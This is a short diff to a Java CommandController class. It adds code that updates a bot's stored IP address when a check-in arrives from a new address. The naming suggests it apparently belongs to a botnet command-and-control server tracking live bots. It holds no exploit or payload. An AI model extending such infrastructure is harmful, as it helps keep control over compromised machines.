@@ -82,6 +82,10 @@ public class CommandController {
 						if (flag){
 							Pairs<IP, String> botAlive = new Pairs<IP, String>(new IP(req.getRemoteAddr()), idBot);
 							cmm.getnServ().getAliveBot().add(botAlive);
+							if(!b.getIp().equals(botAlive.getValue1().toString())){
+								b.setIp(botAlive.getValue1().toString());
+								cmm.getbServ().updateBot(b);
+							}
 							response = new Pairs<Long, Integer>(new Long(-1), -1);
 						}
 							
